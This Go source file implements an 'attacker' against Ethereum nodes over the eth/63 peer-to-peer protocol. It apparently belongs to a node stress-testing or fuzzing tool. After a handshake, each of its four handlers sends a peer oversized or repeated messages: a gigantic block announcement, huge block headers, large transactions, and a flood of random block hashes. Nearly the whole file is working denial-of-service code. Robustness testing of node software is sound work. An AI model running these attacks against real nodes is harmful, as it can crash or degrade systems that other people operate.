package main

import (
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/eth"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/p2p"
	"sync"
	"time"
)

type attacker struct {
	wg      sync.WaitGroup
	attacks []p2p.Protocol
	num     int
	dc      *dataCollector
}

func newAttacker(dc *dataCollector) *attacker {
	a := &attacker{
		dc: dc,
	}

	attacks := []p2p.Protocol{
		{Name: "eth", Version: 63, Run: a.largeAnnounce, Length: 17},
		{Name: "eth", Version: 63, Run: a.largeBlockHeader, Length: 17},
		{Name: "eth", Version: 63, Run: a.largeTransactions, Length: 17},
		{Name: "eth", Version: 63, Run: a.blockhashBomb, Length: 17},
	}
	a.attacks = attacks
	return a
}

func (a *attacker) sendStatusMessage(rw p2p.MsgReadWriter) error {
	return p2p.Send(rw, eth.StatusMsg, a.dc.ethStatus)
	//&statusData{
	//	ProtocolVersion: a.dc.ethStatus.ProtocolVersion,
	//	NetworkId:       a.dc.ethStatus.NetworkId,
	//	TD:              a.dc.ethStatus.TD,
	//	CurrentBlock:    a.dc.ethStatus.CurrentBlock,
	//	GenesisBlock:    a.dc.ethStatus.GenesisBlock,
	//})
}

func (a *attacker) next() []p2p.Protocol {
	if a.num < len(a.attacks) {
		a.num++
		return []p2p.Protocol{a.attacks[a.num-1]}
	}
	return nil
}
func (a *attacker) waitForCompletion() {
	a.wg.Wait()
}
func (a *attacker) largeAnnounce(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	a.wg.Add(1)
	defer func() {
		// If we disconnect too soon, the remote peer might ignore the msg
		time.Sleep(3 * time.Second)
		a.wg.Done()
		a.wg.Wait()
	}()
	a.sendStatusMessage(rw)
	log.Info("Sending gigantic block")
	return p2p.Send(rw, eth.NewBlockMsg, largeNewBlockData())
}
func (a *attacker) largeBlockHeader(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	a.wg.Add(1)
	defer func() {
		// If we disconnect too soon, the remote peer might ignore the msg
		time.Sleep(3 * time.Second)
		a.wg.Done()
		a.wg.Wait()
	}()

	a.sendStatusMessage(rw)
	log.Info("Sending gigantic block headers")
	data := []*types.Header{largeHeader(), largeHeader()}
	return p2p.Send(rw, eth.BlockHeadersMsg, data)
}

func (a *attacker) largeTransactions(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	a.wg.Add(1)
	defer func() {
		// If we disconnect too soon, the remote peer might ignore the msg
		time.Sleep(3 * time.Second)
		a.wg.Done()
		a.wg.Wait()
	}()
	a.sendStatusMessage(rw)

	log.Info("Sending gigantic transactions")
	return p2p.Send(rw, eth.TxMsg, largeTxs())
}

func (a *attacker) blockhashBomb(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
	a.wg.Add(1)
	defer func() {
		// If we disconnect too soon, the remote peer might ignore the msg
		time.Sleep(3 * time.Second)
		a.wg.Done()
		a.wg.Wait()
	}()
	a.sendStatusMessage(rw)

	log.Info("Sending lots of  block hashes")
	for i := 0; i < 100; i++ {
		if err := p2p.Send(rw,
			eth.NewBlockHashesMsg,
			randomBlockHashes(100)); err != nil {
			return err
		}
	}
	return nil
}
